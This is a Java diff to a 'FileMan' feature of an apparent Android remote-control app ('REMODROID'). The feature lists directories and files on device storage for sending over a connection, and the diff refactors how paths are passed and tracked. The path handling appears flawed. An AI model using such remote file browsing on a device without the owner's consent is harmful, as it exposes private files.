@@ -12,17 +12,20 @@ public class FileMan extends Feature {
     private static final char NamesSplitChar = '/'; //names
     private static final char TypeSplitChar = '\\'; // dir or file
     private String path;
-    public FileMan(String params){
-        this.path = params;
+    private String CurrentPath = "";
+    public FileMan(){
+
         UseMainConnection = false;
         Feature_type = DataHandler.eDataType.FM_LIST.ordinal();
 
     }
 
     @Override
-    public void AsyncTaskFunc() {
-
+    public void AsyncTaskFunc(String Params) {
+        this.path = Params;
         //Log.d("REMODROID",getList(path));
+
+        path += CurrentPath;
         try {
             String toSend = getList(path);
 
@@ -31,6 +34,11 @@ public class FileMan extends Feature {
         } catch (UnsupportedEncodingException e) {
             e.printStackTrace();
         }
+    }
+
+    @Override
+    public void update(String Params) {
+
     }
 
     private String getList(String dir){
@@ -49,7 +57,7 @@ public class FileMan extends Feature {
                 sb.append(getDirs(System.getenv("EXTERNAL_STORAGE")));
                 sb.append(TypeSplitChar);
                 sb.append(getFiles(System.getenv("EXTERNAL_STORAGE")));
-
+                CurrentPath += System.getenv("EXTERNAL_STORAGE");
                 break;
             case "SDCard":
 //                sb.append(getDirs(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()));
@@ -58,6 +66,7 @@ public class FileMan extends Feature {
                 sb.append(getDirs(System.getenv("SECONDARY_STORAGE")));
                 sb.append(TypeSplitChar);
                 sb.append(getFiles(System.getenv("SECONDARY_STORAGE")));
+                CurrentPath += System.getenv("SECONDARY_STORAGE");
                 break;
             default:
                 sb.append(getDirs(dir));
